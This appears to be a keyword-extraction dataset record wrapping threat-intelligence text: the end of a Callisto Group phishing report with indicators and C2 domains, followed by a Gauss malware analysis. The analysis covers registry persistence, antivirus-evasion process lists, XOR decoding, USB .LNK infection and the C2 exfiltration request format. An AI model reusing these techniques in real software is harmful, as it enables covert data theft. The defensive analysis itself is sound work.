that would suggest a financial motive .It is worth noting that during our investigation we uncovered links between infrastructure associated with the Callisto Group and infrastructure used to host online stores selling controlled substances . While we don’t yet know enough to fully understand the nature of these links, they do suggest the existence of connections between the Callisto Group and criminal actors .While the targeting would suggest that the main benefactor of the Callisto Group’s activity is a nation state with specific interest in the Eastern Europe and South Caucasus regions, the link to infrastructure used for the sale of controlled substances hints at the involvement of a criminal element . Finally, the infrastructure associated with the Callisto Group and related infrastructure contain links to at least Russia, Ukraine, and China in both the content hosted on the infrastructure, and in WHOIS information associated with the infrastructure .It is possible to come up with a number of plausible theories to explain the above findings . For example, a cyber crime group with ties to a nation state, such as acting on behalf of or for the benefit of a government agency, is one potential explanation . However, we do not believe it is possible to make any definitive assertions regarding the nature or affiliation of the Callisto Group based on the currently available information .CONTINUING ACTIVITY The Callisto Group continues to be active . While they have been last known to employ malware in February 2016, they continue setting up new phishing infrastructure every week .Should the Callisto Group be alerted to the fact that they have been noticed, we do not know how they will react . They may stop everything or they may continue as if nothing has happened . However, as long as they believe they are succeeding in staying unnoticed, we believe it is highly likely that they will continue their phishing activity, and follow up any successful compromises with additional malware attacks .5IDENTIFICATION, MITIGATION, AND REMEDIATIONIDENTIFYING CALLISTO GROUP ACTIVITY Appendix A provides indicators of compromise that can be used to attempt to identify Callisto Group activity . Every effort has been made to thoroughly document the tools, techniques, and procedures of the Callisto Group, as well as possible methods of identifying whether an individual or organization has been targeted or compromised by this threat actor . However, it is possible that the Callisto Group is also using other tools, techniques, and/or procedures that would evade identification by the provided methods .It is highly encouraged that any, even slight, suspicion of compromise be thoroughly investigated .REMEDIATION AGAINST CREDENTIAL PHISHING Should a user suspect having fallen victim to credential phishing, immediate remediating action should be taken to reset the suspected compromised credentials and enable two-factor authentication . Any other services where the user may have reused the same username and/or password should also have the credentials reset .These immediate actions should be followed by a thorough investigation to determine the extent of the possible compromise, to understand what data may have been compromised, what actions the attackers may have taken with the help of the compromised credentials, and what the implications of these actions and compromise may be .REMEDIATION AGAINST RCS GALILEOShould a user suspect having become infected with RCS Galileo, their computer should immediately be disconnected from the internet . However, care should be taken to not power off the computer as this would hinder the ensuing investigation into the compromise .Once the computer has been disconnected from the internet, the malware will be unable to communicate with its command and control server, thereby disrupting the attacker’s ability to control the computer . This should immediately be followed by initiating a thorough forensic investigation into the compromise .Should the affected organization or individual not have complete confidence in their ability to properly perform such an investigation, they should employ outside assistance .MITIGATION AGAINST CREDENTIAL PHISHING Using two-factor authentication for accessing email would prevent the attackers from using compromised credentials to gain access to a target’s email account . However, the compromise of login credentials, especially should the victim not employ proper password hygiene (such as by reusing passwords), is a security risk in itself .MITIGATION AGAINST SPEAR PHISHING AND RCS GALILEO The spear phishing emails used in the known attacks by the Callisto Group were so convincing that even skilled and alert users would likely have attempted to open the malicious attachment . However, simply viewing the attachment would not have resulted in an infection as the document did not attempt to exploit any vulnerabilities .Actual infection would have required the user to attempt to click a specific icon in the opened attachment . Furthermore, at least recent versions of Microsoft Word will prompt the user with an additional warning stating that what the user is about to do is dangerous . For the infection to succeed, the user would either have to acknowledge the prompt or be using an old enough version of Microsoft Word to not be warned .Additionally, the malware payload used, RCS Galileo, is relatively well known . Therefore, most antivirus solutions provide good protection against RCS Galileo and would have blocked the execution of the malware payload . Using an up-to-date antivirus solution with all protection features enabled is the most effective mitigation against highly targeted attacks such as these .6APPENDIx A | INDICATORS OF COMPROMISESAMPLE HASHESSHA1 of related RCS Galileo sample . We believe other phishing . These may be used as targets of links or as domains for sender email addresses .DETECTION NAMESF-Secure detects Callisto Group activity with a variety of generic, behavioral, and other detections including the following:Gen:Variant .Symmi .54992FILE PATHSUpon infection, known samples of Callisto Group’s RCS Galileo have stored copies of themselves in the following locations:%TEMP%\Microsoft Word .exe %TEMP%\WinWord .exe >startup folder<\bleachbit .exe >startup folder<\BluetoothView .exeCOMMAND & CONTROL INFRASTRUCTUREKnown command & control servers89 .46 .102 .43accounts-google .eu accounts-mail .asia authentification-request .top auth-login .top drive-login .com drive-meet-goodle .ru emailapp .pw fco-gov .pw fco-net .pw google-accounts .eu google-plus .top google-service .eu go-veryfication .link hotmail-online .eu icloud-service .pw live-com .pw live-login .info login-access .top login-live .review login-livecom .in login-livecom .info login-live-com .pw misrcosofts .com node005-prevention-aol .link node03-prevention-icloud .link platforma .link prevention-aol .link prevention-aol .top prevention-icloud .link qooqle-support-mail .pw screenname .click screenname-aol .pw secure-lcloud .accountant secure-store-lcloud .top service-mail .asia service-mail .in serv-login-com .pw shared-docs .pw store-icloud .link support-gmail .pw support-mail .pw support-mail .top ","{'phrases': ['targets', 'access', 'intelligence', 'security', 'Eastern Europe', 'South Caucasus', 'regions', 'Credential phishing emails', 'google', 'the target', 'credentials', 'email accounts', 'Spear phishing emails', 'The emails', 'the attachment', 'the malware', 'Scout', 'HackingTeam', 'Galileo', 'system information', 'command', 'CONTROL', 'data', 'the compromise', 'interest', '10', 'new phishing infrastructure'], 'target': 'targets; access; intelligence; security; Eastern Europe; South Caucasus; regions; Credential phishing emails; google; the target; credentials; email accounts; Spear phishing emails; The emails; the attachment; the malware; Scout; HackingTeam; Galileo; system information; command; CONTROL; data; the compromise; interest; 10; new phishing infrastructure.'}"
the attack; a LNK exploit; the CVE-2010-2568 vulnerability; the CVE-2010-2568 exploit; the Flame module; the Trojan; data; Inject; additional modules; the system; commands; the communication; data; files; security products; the Flame; Tilded; Quasar; malware.,"['1. Spearphishing emails distribute weaponized Office docs to initial targets. 2. Documents exploit flaws to execute shellcode and download the Gauss payload. 3. The main ShellHW component installs and configures the other Gauss modules. 4. Modules like Godel, UsbDir, Gauss, etc. collect system and browser data. 5. The Gauss module steals Lebanese bank account credentials. 6. Data is encrypted and exfiltrated to the C2 servers over HTTPS. 7. The USB payload infects removable drives and extracts data from other systems. 8. An encrypted payload has unknown functionality when executed from infected USB drives. 9. C2 servers can push new modules or commands to compromised hosts. ']","Extract the keywords: Operating System Statistics Architecture Comparison with Flame Wmiqry32/Wmihlp32.dll aka ShellHW thumbs.db file Gauss C&C Information Gauss C2 Domains Overview: Conclusion2IntroductionWhile analyzing the Flame malware that we detected in May 2012, Kaspersky Lab experts identified some distinguishing features of Flame’s modules. Based on those features, we discovered that in 2009, the first variant of the Stuxnet worm included a module that was created based on the Flame platform. This indicates that there was some form of collaboration between the groups that developed the Flame and Tilded (Stuxnet/Duqu) platforms.Based on the results of a detailed analysis of Flame, we continued to actively search for new, unknown components. A more in-depth analysis conducted in June 2012 resulted in the discovery of a new, previously unknown malware platform that uses a modular structure resembling that of Flame, a similar code base and system for communicating to C&C servers, as well as numerous other similarities to Flame.In our opinion, all of this clearly indicates that the new platform which we discovered and which we called “Gauss,” is another example of a cyber-espionage toolkit based on the Flame platform.Gauss is a project developed in 2011-2012 along the same lines as the Flame project. The malware has been actively distributed in the Middle East for at least the past 10 months. The largest number of Gauss infections has been recorded in Lebanon, in contrast to Flame, which spread primarily in Iran.Functionally, Gauss is designed to collect as much information about infected systems as possible, as well as to steal credentials for various banking systems and social network, email and IM accounts. The Gauss code includes commands to intercept data required to work with several Lebanese banks – for instance, Bank of Beirut, Byblos Bank, and Fransabank.Curiously, several Gauss modules are named after famous mathematicians. The platform includes modules that go by the names “Gauss”, “Lagrange”, “Godel”, “Tailor”, “Kurt” (in an apparent reference to Godel). The Gauss module is responsible for collecting the most critical information, which is why we decided to name the entire toolkit after it.Gauss is a much more widespread threat than Flame. However, we have found no self-replication functionality in the modules that we have seen to date, which leaves open the question of its original attack vector.3Executive SummaryThe first known Gauss infections date back to September-October 2011. During that period, the Gauss authors modified different modules multiple times. They also changed command server addresses. In the middle of July 2012, when we had already discovered Gauss and were studying it, the command servers went offline.Gauss is designed to collect information and send the data collected to its command-and-control servers. Information is collected using various modules, each of which has its own unique functionality:► Injecting its own modules into different browsers in order to intercept user sessions and steal passwords,cookies and browser history.► Collecting information about the computer’s network connections.► Collecting information about processes and folders.► Collecting information about BIOS, CMOS RAM.► Collecting information about local, network and removable drives.► Infecting USB drives with a spy module in order to steal information from other computers.► Installing the custom Palida Narrow font (purpose unknown).► Ensuring the entire toolkit’s loading and operation.► Interacting with the command and control server, sending the information collected to it, downloading additional modules.The spy module that works on USB drives uses an .LNK exploit for the CVE-2010-2568 (url vuln/detail?vulnId=CVE-2010-2568) vulnerability. The exploit is similar to the one used in the Stuxnet worm, but it is more effective. The module masks the Trojan’s files on the USB drive without using a driver. It does not infect the system: information is extracted from it using a spy module (32- or 64-bit) and saved on the USB drive.4Infection statsWe began our investigation into Gauss in early June 2012. Based on data obtained through the Kaspersky Security Network, we noticed right away that the Trojan appeared to be widely distributed in three particular countries in the Middle East.Further observation later confirmed this three-country concentration. As of 31 July 2012, we’ve counted around 2500 unique PCs on which files from the Gauss collection have been found.Most infected countriesThe highest number of infections is recorded in Lebanon, with more than 1600 computers affected. The Gauss code (winshell.ocx) contains direct commands to intercept data required to work with Lebanese banks – including the Bank of Beirut, Byblos Bank and Fransabank.In Israel and the Palestinian Territory, 750 incidents have been recorded.Lebanon United Arab Emirates 4Top 10 infected countries5As can be seen in the above table, with the exceptions of the USA and Germany, all incidents took place in the Middle East. However, we believe that in the majority of cases linked to the USA and Germany the affected users were actually in the Middle East too - using VPNs (or the Tor anonymity network).In all, we’ve recorded incidents in 25 countries around the world; however, in all the countries outside the top 10 only one or two incidents have been recorded:Total infected usersRegarding the spreading mechanism used by Gauss, the obtained data leave us with more questions unanswered than solved. The overall number of infections (around 2500) that we’ve detected could in reality just be a small portion of tens of thousands of infections, since our statistics only cover users of Kaspersky Lab products.6When we compare the number of Gauss infections with those of other programs discovered earlier that have either common components or structures, we get the following figures:Name DuquIncidents (KL stats) More than 100 000Incidents (approx.) More than 300 000~ 2500 ~ 700 ~20?~5000-6000~50-60Gauss has been spreading in the region for at least 10 months, in the course of which it has infected thousands of systems. On one hand, this is an uncharacteristically high number for targeted attacks similar to Duqu (it’s possible that such a high number of incidents is due to the presence of a worm in one of the Gauss modules that we still don’t know about). However, the infections have been predominantly within the boundaries of a rather small geographical region. If the malware had the ability to spread indiscriminately – for example, on USB sticks as was the case with Stuxnet – infections would have been detected in much greater numbers in other countries.Operating System StatisticsGauss was designed for 32-bit versions of the Windows operating system. Some of the modules do not work under Windows 7 SP1.OS Windows 7 XP Professional SP2 XP Professional SP3 Windows 7 SP1 Windows 7 Home Vista Home SP1 Vista Home Windows 7 Home SP1 Vista Home SP2 XP Home Edition Vista SP1 Other% from total34.87 1.47There is a separate spy module that operates on USB drives (see description of dskapi.ocx) and is designed to collect information from 64-bit systems.7ArchitectureGauss is a modular system. The number and combination of modules may change from one infected system to another. In the course of our research, we discovered the following modules:Module nameLocationDescriptionCosmos Lagrange%system32%\devwiz.ocx %system32%\dskapi.ocx %system32%\lanhlp32.ocx %system32%\mcdmn.ocx %system32%\smdk.ocx %system32%\windig.ocxCollects information about CMOS, BIOS Infects USB drives with data-stealing module Collects information about network interfaces Collects information about user’s domain Collects information about computer’s drives Installs a custom “Palida Narrow” fontGauss%system32%\winshell.ocxInstalls browser plugins that collect passwords and cookiesShellHW%system32%\wbem\wmiqry32.ocx %system32%\wbem\wmihlp32.ocxMain loader and communication moduleThe configuration of a specific combination of modules for each system is described in a special registry key. This technique, as well as the configuration structure itself, is similar to that used in Stuxnet/Duqu (storing of the configuration in the Windows registry) and Flame (configuration structure). Flame stores its configuration in the main module (mssecmgr.ocx).We created a special detection routine which helped us to discover various Gauss configurations based on registry settings on infected machines. We detected about 1700 such configurations in total, which revealed a picture of modules Kurt (aka Godel) Gauss 1.0.8 Tailor McDomain 1.2 Cosmos LagrangeNumber of PC with the module(defined in config)1655 3You can see three main modules, which are used in most cases – Gauss, Godel and UsbDir.8Some examples of different configs:Cosmos Gauss McDomain 1.2 UsbDirCosmos Gauss 1.0.8 Godel McDomain 1.2 Gauss 1.0.8Godel UsbDirAs mentioned above, we have been unable to discover the original infection vector and the dropper file that installs Gauss in the system. In all the systems we have studied, we dealt with a set of modules that was already installed. It is possible that during initial infection, only the ShellHW component is installed, which then installs the other modules.ShellHW (file name “wmiqry32.dll”/”wmihlp32.dll”) is the main component of the malware which ensures that all other Gauss modules are loaded when the malware starts and operate correctly.9Comparison with FlameAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame. In fact, it is largely due to these similarities that Gauss was discovered. We created the following table for a clearer understanding of these facts and proof of ‘kinship’ between the two attack platforms:Feature Modular architecture Using kernel drivers .OCX files extensions Using USB as storage Embedded LUA scripting Browser history/cookies stealer CVE2010-2568 (.LNK exploit) C&C communication Log files/stolen data stored in %temp% Zlib compression of collected dataFlame YesPredefined in main bodyStored in registryYes Yes XORYes (hub001.dat)YesYes (soapr32/nteps32)Yes (target.lnk)https XORYes (.thumbs.db)NoYes (winshell) Yes (target.lnk)https Yes YesIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C servers. The relevant analysis is provided in the C&C Communication section.There are more similarities in the code and data of the modules:► C++ runtime type information (RTTI) structures are encoded to hide the names of the standard library classes. The same encoded names can be found in both Flame and Gauss modules, i.e. the first RTTI structure contains name “AVnxsys_uwip” that most likely belongs to the “AVtype_info” class.rpcns4.ocx Flame module: “Flask”winshell.ocx Gauss module: “Gauss”10► Most of Flame and Gauss modules contain dozens of object initialization functions that construct string objectsfrom encrypted data. The layout of these functions is almost identical.mssecmgr.ocxFlame main modulewmiqry32.dll, wmihlp32.dllGauss main module► String decryption routines (“GetDecryptedStrings” used in initialization functions) are very similar, although notidentical, because the layout of the structures holding encrypted strings was changed.mssecmgr.ocxFlame main modulewmiqry32.dll, wmihlp32.dllGauss main module11Wmiqry32/Wmihlp32.dll aka ShellHWInstalled by: Unknown dropperOperates in two modes: installation and normal operation.File namesSome known MD5Image Size Number of resources Resources Date of compilationRelated files%system32%\wbem\wmiqry32.dll %system32%\wbem\wmihlp32.dll 258 048 bytes 7 121, 131, 141, 151, 161, 171, 181 Jun 1 2011 Jul 16 2011 Jul 18 2011 Sep 28 2011 Oct 20 2011 %temp%\~shw.tmp %temp%\~stm.tmpInstallationThe module checks if it was loaded by “lsass.exe” process and, if true, proceeds with the installation.It writes itself in files: %system32%\wbem\wmiqry32.dll, %system32%\wbem\wmihlp32.dll and modifies the system registry to be loaded instead of %system32%\wbem\wbemsvc.dll file.To achieve this, it writes the following registry value:[HKCR\CLSID\{7C857801-7381-11CF-884D-00AA004B2E24}\InProcServer32] Default = %system32%\wbem\wmihlp32.dllOperationThe module is automatically loaded into processes that use wbemsvc.dll. When loaded in “svchost.exe” that was started with “-k netsvc” parameter, it starts its main thread.The module creates “ShellHWStop”, “Global\ShellHWDetectionEvent” events, mutex “ShellHWDetectionMutex”.12The main thread exits if the following processes were found at its start:LMon.exe zerospywarele.exe13sagui.exe csi-eui.exe dvpapi.exeRDTask.exe spywat~1.exe espwatch.exekpf4gui.exe dltray.exezerospywarelite_installer.exe CV.execlamd.exe VSDesktop.exefgui.exe ipctray.exedlservice.exe avastsvc.exeThe module reads the registry value “SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability” “TimeStampForUI”. It is an encrypted configuration file. The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules’ additional files.Gauss %systemroot%\system32\winshell.ocx %temp%\ws1bin.dat %windir%\system32\dskapi.ocx %temp%\~gdl.tmp %windir%\system32\smdk.ocx %temp%\~mdk.tmpString values from config file (example)14Every module is loaded and its export functions are called as specified in the configuration. Most of the actions are logged in an encrypted (with XOR) file “%temp%\~shw.tmp”.Sample of decrypted “~shw.tmp”After loading additional modules, it tries to acquire the same privileges as “explorer.exe” and then starts its C&C interaction loop.Prior to communicating with the C&C, all the information from the other modules’ log files is copied to the ~shw.tmp file. Paths to the log files are taken from the TimeStampForUI configuration file. As a result, at this stage ~shw.tmp becomes a universal container file containing all the stolen data.It checks Internet connection (https) by accessing URLs specified in its resource 161.It then checks an https connection with www.google.com or www.update.windows.com. If “200 OK” is received in reply, it sends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.15When an Internet connection is available, it connects to its C&C servers that are specified in resource 131:Connection is established using WinInet API and is performed in two stages:1. GET request to the server. The response from the server is expected to contain new modules, commands orconfiguration data.GET [C&C domain]/userhome.php?sid=[random string]==&uid=VfHx8fHx8fHx8fHx8f Hx8fHx8fE=2. POST request to the server with the contents of the file “~shw.tmp” that contains all datacollected from the infected computer.The response from the server is decrypted using XOR and 0xACDC as the key. Exfiltrated data is compressed with Zlib.The C&C connection routine is controlled by a DWORD value that is read from the registry value:[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability] ShutdownIntervalSnapshotUIThe initial value of the counter is read from resource 181 and is equal to 56. The counter is decremented every time the module fails to connect to its C&C server or to the servers specified in resource 161 and it is reset to the initial value after every successful connection to the C&C server. The module exits the C&C connection loop when the value of the counter becomes equal to zero.ResourceDescription121 1813 DWORDs, related to list of AVs Hostnames and URLs of C&C servers List of AVs, firewalls, etc. Additional configuration DWORDs Hostnames and URLs of legitimate sites to check Internet connection String with cryptic identifiers DWORD, number of attempts to connect to the C&C before giving up16File Version: 2001.12.4414.320 Product Version: 5.1.2600.5788 File OS: WINDOWS32 File Type: DLL File SubType: UNKNOWN Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: WMI COM Helper FileVersion: 2001.12.4414.320 LegalCopyright: Copyright (C) Microsoft Corp. 1995-1999 LegalTrademarks: Microsoft(R) is a registered trademark of Microsoft Corporation. Windows(TM) is a trade mark of Microsoft Corporation ProductName: WMI COM Services Help ProductVersion: 05.01.2600.5788Version info “wmiqry32.dll”17Dskapi.ocxName of the module used in Gauss: “Godel” or “Kurt”.File names%system32%\dskapi.ocxSome known MD5Image SizeNumber of resources Resources Date of compilationRelated filesED5559B0C554055380D75C1D7F9C4424 1 327 104 bytes 954 368 bytes 962 560 bytes 417 792 bytes 28.09.2011 13.10.2011 01.11.2011 29.11.2011 %temp%\~gdl.tmp .CatRoot.tmpCreates events: “{12258790-A76B}”, “Global\RasSrvReady”All functionality is implemented in “RevertCache” export. The module starts its main thread and then returns. The main thread waits for the “{12258790-A76B}” event and continuously checks for the presence of anti-malware software.“ValidateEntry” signals the “{12258790-A76B}” event, allowing for the main thread to work for 3 seconds before terminating it.Writes log file: %temp%\~gdl.tmpThe log file entries are compressed with Zlib.Reads registry key HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum18Checks for running anti-malware products by names and exits if they are present:AVKProxy.exe AVKService.exeAVKTray.exe AVKWCtl.exeGDFirewallTray.exeGDFwSvc.exe GDScan.exeabcd.exe avp.exefameh32.exefch32.exe fsdfwd.exefsgk32.exe fsmb32.exefsorsp.exe fspc.exe fsqh.exefssm32.exefsus.exe gsava.exe gssm32.exevsmon.exe zapro.exe zlclient.exeIt also exits if started on Windows 7 SP 1.By querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching “USBSTOR” string in their information.When a drive contains “.thumbs.db” file, its contents are read and checked for the valid magic number 0xEB397F2B. If it matches, the module creates %commonprogramfiles%\system\wabdat.dat and writes the data to this file, and then deletes “.thumbs.db”.Then, it infects the USB drives by creating directories with the names .Backup0[D-M] and .Backup00[D-M]19Infected USB root folder (before activation)Each directory contains a specially crafted desktop.ini file and target.lnk file that exploits the LNK vulnerability.target.lnk[.ShellClassInfo] CLSID = {0AFACED1-E828-11D1-9187-B532F1E9575D} CLSID2 = {0AFACED1-E828-11D1-9187-B532F1E9575D} UICLSID = {0AFACED1-E828-11D1-9187-B532F1E9575D}desktop.iniListing of .Backup0* directoryIn the root directory of the drive it creates files “System32.dat” and “System32.bin”, the payload DLLs, and the “.thumbs.db” file. The payloads are stored as resources and encrypted with a simple XOR routine.static int decrypt(uint8_t *data, unsigned int dataLen) }uint32_t acc = 0xCC; for ( unsigned int i = 0; i < dataLen; i++ ) return 0;uint8_t acc2 = data[i]; data[i] ^= acc; acc = acc2;20Resource100 101File nameSystem32.dat (.CatRoot.tmp) System32.bin (.CatRoot.tmp)Description 32-bit payload 64-bit payloadUSB PayloadBoth 32-bit and 64-bit DLLs implement the same functionality. When loaded using the LNK vulnerability, they start a main thread and return. The main thread copies the payload to %TEMP% directory and loads itself again. When loaded from %TEMP%, it creates a mutex “Isvp4003ltrEvent”, patches the “NtQueryDirectoryFile” function in ntdll.dll so that it hides its files and then sends the “F5” key event to windows of classes “SysListView32”, “SysTreeView32”, “DirectUIHWND”, causing Explorer directory listings to refresh. This hides the files. It also waits for the event “Global\RasSrvReady”.Then, it retrieves the following data from the system:► Version of the Windows OS► Workstation info► Network adapter information► Routing table► Process list► Environment variables and disk information► List of visible network shares► Network proxy information► List of visible MS SQL servers► URL cacheAll this information is encoded and appended to the file “.thumbs.db” on the infected storage. This file also contains a TTL (time to live) value that is decremented by 1 each time the payload starts from the infected storage. When this counter becomes equal to zero, the payload disinfects the media by removing “.Backup0*” directories and “System32.dat” and “System32.bin” files, leaving “.thumbs.db” file with collected information. Known value of the TTL value is “30.”There are several “special” versions of the payload. They contain additional PE sections with names “.exsdat,” “.exrdat,” and “.exdat”. These sections are encrypted with RC4. The encryption key is derived from an MD5 hash performed 10000 times on a combination of “%PATH%” environment string and name of the directory in %PROGRAMFILES%.The RC4 key is not yet known, neither is the contents of these sections. The payload also contains a binary resource 100 that is also encrypted.21thumbs.db fileThis is a container for data stolen by the “dskapi” payload.Offset Magic number : 0xEB397F2B TTL counter Encoded dataThe encoded data consists of arrays of encoded strings, separated by a magic value 0xFF875686.Offset 0xFF875686 – end of array of records, must search for the next Magic 0xFF875683 XOR ( recordLength + 5 ) – start of record Encrypted string data, recordLength bytesEvery record is encrypted by a simple algorithm using the character’s position and record length and can be decrypted with the following code:for ( unsigned int j = 0; j < recordLen; j++ )ptr[i + j] ^= recordLen; ptr[i + j] -= j;{ }File Version: 5.1.3700.0 Product Version: 5.1.3700.0 File OS: NT (WINDOWS32) File Type: DRV File SubType: DRV SOUND File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Disk Helper FileVersion: 5.1.3700.0 InternalName: dskapi.ocx LegalCopyright: © Microsoft Corporation. All rights reserved. OriginalFilename: dskapi.ocx ProductName: Microsoft® Windows® Operating System ProductVersion: 5.1.3700.0Version info “dskapi.ocx”22Smdk.ocxName of the module used in Gauss: “UsbDir”File names Some known MD5Image Size Date of compilationRelated files%system32%\smdk.ocx 212 992 bytes 27.09.2011 17.10.2011 %temp%\~mdk.tmpCreates events: “{B336C220-B158}”, “Global\SmSrvReady”All functionality is implemented in “RevertCache” export. The module starts its main thread and then returns. The mainthread waits for the “{B336C220-B158}” event and continuously checks for the presence of anti-malware software.“ValidateEntry” signals the “{B336C220-B158}” event, allowing for the disk enumeration routine to start.Writes log file: %temp%\~mdk.tmpReads registry key HKLM\SYSTEM\CurrentControlSet\Services\Disk\EnumChecks for running antimalware products by names and exits if they are present:AVKProxy.exe AVKService.exeAVKTray.exe AVKWCtl.exeGDFirewallTray.exeGDFwSvc.exe GDScan.exeabcd.exe avp.exefameh32.exefch32.exe fsdfwd.exefsgk32.exe fsmb32.exefsorsp.exe fspc.exe fsqh.exefssm32.exefsus.exe gsava.exe gssm32.exeThe version of the module built on 27.09.2011 also exits if started on Windows 7 SP 1.By querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching “USBSTOR” string in their information.The log file entries are compressed with Zlib.23File Version: 5.1.3700.0 Product Version: 5.1.3700.0 File OS: NT (WINDOWS32) File Type: DRV File SubType: DRV SOUND File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Disk Helper FileVersion: 5.1.3700.0 InternalName: dskapi.ocx LegalCopyright: © Microsoft Corporation. All rights reserved. OriginalFilename: dskapi.ocx ProductName: Microsoft® Windows® Operating System ProductVersion: 5.1.3700.0Version info “smdk.ocx” (the same as in dskapi.ocx)24McDmn.ocxName of the module used in Gauss: “McDomain”File names Date of compilation Related files%system32%\mcdmn.ocx 9CA4A49135BCCDB09931CF0DBE25B5A9 102 400 bytes 16.09.2011 %temp%\md.bakThis module is a Windows DLL file with one exported function called “DllRegisterServer.”It creates log file: %temp%\md.bak that is encrypted with 2-byte XOR.Uses LsaQueryInformationPolicy to retrieve the name of the primary domain. Retrieves information about network adapters. All this information is encrypted and stored in the log file.File Version: 2001.12.4414.320 Product Version: 5.1.2600.5788 File OS: WINDOWS32 File Type: DLL File SubType: UNKNOWN File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Windows File Extension FileVersion: 2001.12.4414.320 LegalCopyright: Copyright (C) Microsoft Corp. 1995-1999 LegalTrademarks: Microsoft(R) is a registered trademark of Micro soft Corporation. Windows(TM) is a trademark of Microsoft Corporation ProductName: Microsoft® Windows® Operating System ProductVersion: 05.01.2600.5788Version info “mcdmn.ocx”25Lanhlp32.ocxName of the module used in Gauss: “Tailor”File names Date of compilation Related files%system32%\lanhlp32.ocx ED2B439708F204666370337AF2A9E18F 278 528 bytes 26.10.2011 %systemroot%\Temp\s61cs3.datThe module is a Windows DLL file with one exported function called “DllRegisterServer.”It contains encrypted debug information that includes the location of the project, “d:\projects\tailor\”:d:\projects\tailor\utils\Exceptions.h \Utils\Buffer.cpp \Utils\CryptUtils.cpp \Utils\Event.cpp \Utils\EveryoneSecurityAttributes.cpp \Utils\File.cpp \Utils\Mutex.cpp \Utils\MyWlanApi.cpp \Utils\OsUtils.cpp \Utils\RemoteMemoryBuffer.cpp \Utils\Storage.cpp \Utils\StringUtils.cpp \Utils\Waiter.cpp .\VisibleNetworks.cppCreates mutex : Global\EnvDBECreates log file: %systemroot%\Temp\s61cs3.datOperates on Windows XP, Windows Vista and Windows 7.On Windows XP:.\SavedWNetworkConnectionsWin5.cppEnumerates registry keys in HKLM\SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\ Extracts “Static#” values that contain wireless key data.26On Windows Vista and Windows 7 : \Utils\MyWlanApi.cpp .\SavedWNetworkConnectionsWin6.cpp .\VisibleNetworks.cppUses extended wlanapi.dll API to access WLAN information. Enumerates available wireless interfaces, then enumerates all profiles and extracts SSID, name and wireless key information. Then, it retrieves the list of wireless networks visible to all the wireless interfaces.The log file is encrypted with a simple 1-byte XOR.File Version: 5.1.3700.0 Product Version: 5.1.3700.0 File OS: NT (WINDOWS32) File Type: DRV File SubType: DRV SOUND File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Microsoft Windows LAN Component FileVersion: 5.1.3700.0 InternalName: lanhlp32.ocx LegalCopyright: © Microsoft Corporation. All rights reserved. OriginalFilename: lanhlp32.ocx ProductName: Microsoft® Windows® Operating System ProductVersion: 5.1.3700.0Version info “lanhlp32.ocx”27Devwiz.ocxName of the module used in Gauss: “Cosmos”File names Date of compilation Related files%system32%\devwiz.ocx CBB982032AED60B133225A2715D94458 102 400 bytes 19.03.2012 %temp%\~ZM6AD3.tmpThe module is a Windows DLL file with one exported function called “RefreshDev.”It creates log file : %WINDIR%\temp\~ZM6AD3.tmpThe log file is not encrypted and starts with a magic number 0xF68B973DThe module collects the following information and writes it to the log file :► CMOS RAM contents► Registry keys :[ HKLM\HARDWARE\DESCRIPTION\System ] SystemBiosVersion,SystemBiosDate[ HARDWARE\DESCRIPTION\System\BIOS ] BIOSVendor, BIOSVersion, BIOSReleaseDate, BaseBoardManufacturer, BaseBoardProduct, BaseBoardVersion, SystemFamily, SystemManufacturer, SystemProductName, SystemSKU, SystemVersionAll retrieved information is written to the log file.28File Version: 5.1.2600.0 Product Version: 5.1.2600.0 File OS: NT (WINDOWS32) File Type: DRV File SubType: DRV SOUND File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Windows Device Wizard FileVersion: 5.1.2600.0 InternalName: devwiz.ocx LegalCopyright: © Microsoft Corporation. All rights reserved. OriginalFilename: devwiz.ocx ProductName: Microsoft® Windows® Operating System ProductVersion: 5.1.2600.0Version info “devwiz.ocx”29Winshell.ocxName of the module used in Gauss: “Gauss”File names Some known MD5Image SizeNumber of resources Resources Date of compilationRelated files%system32%\winshell.ocx 405 504 (August 2011) 417 792 (October 2011) 401 408 (Dec 2011 - Jan 2012) 6 121,122,123,124,125,126 08.08.2011 03.10.2011 14.12.2011 05.01.2012 %temp%\ws1bin.dat pddp.datCreates events: “Global\SrvReportCondition”, “Global\DhwSyncEvent”, “Global\ShellSync”Interestingly, all three variants of the module that we have analyzed contain information about the location and names of the original projects:Variant Dec 2011-Jan 2012Path to project files d:\projects\gauss d:\projects\gauss_for_macis_2 c:\documents and settings\flamer\desktop\gauss_white_130Contains encrypted debug information that includes the location and files of the project:c:\documents and settings\flamer\desktop\gauss _ white _ 1\utils\ c:\documents and settings\flamer\desktop\gauss _ white _ 1\utils\SmartPtr.h .\Injector.cpp c:\documents and settings\flamer\desktop\gauss _ white _ 1\gauss\ /Utils/ComUtils.h c:\documents and settings\flamer\desktop\gauss _ white _ 1\minime\ /Utils/SmartPtr.h The debug information which was accidentally forgotten by the developers provides some interesting details. For instance, the Windows username which compiled the project can be seen in the strings above as “flamer”.31DllMain starts a thread only if loaded by “explorer.exe”.Writes log file: %systemroot%\Temp\ws1bin.dat. Log file starts with magic number 0x0A86FD375, encrypted with 1-byte XOR 0x46. Log file writer is guarded by mutex “Global\ShellSyncCom”.Reads registry key :SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability ShutdownInterval = binary dataChecks Windows version and, onWindows Vista and Windows 7, it accesses %SystemDrive%\Users. On earlier versions, it uses %SystemDrive%\Documents and settings and gets list of directories there.Export “InitShellEx” : Enumerates all entries in HKEY _ USERS, 